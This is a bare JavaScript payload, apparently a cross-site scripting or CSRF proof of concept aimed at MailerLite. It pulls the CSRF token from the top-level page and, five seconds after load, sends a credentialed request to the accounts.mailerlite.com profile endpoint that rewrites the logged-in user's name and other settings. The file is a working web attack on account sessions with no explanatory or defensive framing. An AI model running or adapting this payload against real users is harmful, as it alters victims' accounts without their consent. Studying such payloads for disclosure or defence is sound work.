
function updateProfile() {
  const xsrfToken = window.top.document.querySelector('input[name="_token"]').value;


  const data = new URLSearchParams();
  data.append('_token', xsrfToken);
  data.append('_method', 'PUT');
  data.append('avatar', '');
  data.append('name', 'Gustavoszzzzzzzzzzzzzzzzzzzzzzzz');
  data.append('last_name', 'Ribeiro');
  data.append('current_password', '');
  data.append('new_password', '');
  data.append('new_password_confirmation', '');
  data.append('language', 'en');
  data.append('subscribed_newsletter_mailerlite', '0');
  data.append('theme', 'light');

  fetch('https://accounts.mailerlite.com/profile', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: data.toString(),
    credentials: 'include'
  })
  .then(response => response.json())
  .then(result => {
    console.log(result);
  })
  .catch(error => {
    console.error('Erro:', error);
  });
}

setTimeout(updateProfile, 5000);
